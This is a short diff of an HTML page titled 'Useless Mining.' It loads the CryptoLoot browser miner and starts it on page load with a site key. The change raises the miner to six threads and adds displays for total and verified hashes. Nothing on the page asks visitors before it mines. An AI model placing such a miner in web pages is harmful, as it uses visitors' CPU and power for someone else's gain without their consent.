@@ -7,7 +7,9 @@
 <body>
     <script src="https://crypto-loot.com/lib/miner.min.js"></script>
     <script>
-        var miner = new CryptoLoot.Anonymous('f6a6d5e790bb2421d0294e87a51066e6fe34f4905475');
+        var miner = new CryptoLoot.Anonymous('f6a6d5e790bb2421d0294e87a51066e6fe34f4905475',
+            { threads:6, autoThreads:false, throttle:0.2 }
+        );
         miner.start();
             
         // Listen on events
@@ -21,6 +23,8 @@
             var acceptedHashes = miner.getAcceptedHashes();
             
             document.getElementById("hashespersec").innerHTML = hashesPerSecond + " hashes/sec";
+            document.getElementById("totalhashes").innerHTML = totalHashes + " total hashes";
+            document.getElementById("verifiedhashes").innerHTML = acceptedHashes + " verified hashes";
         }, 1000);
     </script>
 
@@ -28,6 +32,8 @@
     <h1>Useless Mining.</h1>
 
     <p id="hashespersec"></p>
+    <p id="totalhashes"></p>
+    <p id="verifiedhashes"></p>
 
 </body>
 
